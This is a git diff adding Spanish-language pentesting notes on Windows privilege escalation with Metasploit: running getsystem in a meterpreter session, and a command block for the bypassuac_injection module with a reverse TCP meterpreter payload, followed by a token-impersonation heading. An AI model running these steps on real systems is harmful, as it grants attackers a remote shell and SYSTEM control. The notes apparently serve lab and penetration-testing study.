@@ -1,3 +1,6 @@
+### Getsystem Metasploit
+Una vez establecida una sesión de meterpreter, lanzando el comando *getsystem* tratará de elevar privilegios con varias técnicas. Si esto no funciona, ya podemos tratar de hacer un UACBypass y luego volver a meter el *getsystem* o combinarlo también con cualquier otra técnica.
+
 ### Exploit Suggester Metasploit
 En windows, si establecemos una sesión de meterpreter con metasploit, podemos lanzar un módulo para intentar realizar la escalada de privilegios. Una vez estableceida la sesión con la víctima:
 
@@ -79,7 +82,20 @@ sysinfo
 getuid
 ```
 
-### Suplantación de token de acceso
+### UACBypass Injection
+Con una sesión de metrpreter establecida.
+```bash
+search bypassuac
+elegir bypassuac_injection
+set payload windows/x64/meterpreter/reverse_tcp
+set SESSION <num sesion establecida anteriormente> <para salir de una sesión ctrl Z y "background"
+set LPORT <cambiar el de por defecto que conicidirá con la otra sesión>
+set TARGET <tabular> y escribir la que nos interese (x64 o x86)
+run
+getsystem (para escalar privilegios abusando del UACBypass)
+getuid (para comprobar que ha funcionado)
+```
+### Suplantación de token de acceso (Impersonate token)
 Al ya tener acceso a la máquina con algún usuario, podemos tratar de suplantar el token de inicio de sesión de otro usuario que tenga mayores privilegios. Para ello es **requisito indispensable** tener al menos estos privilegios en el usuario con el que tenemos acceso a la máquina:
 
 **getprivs**
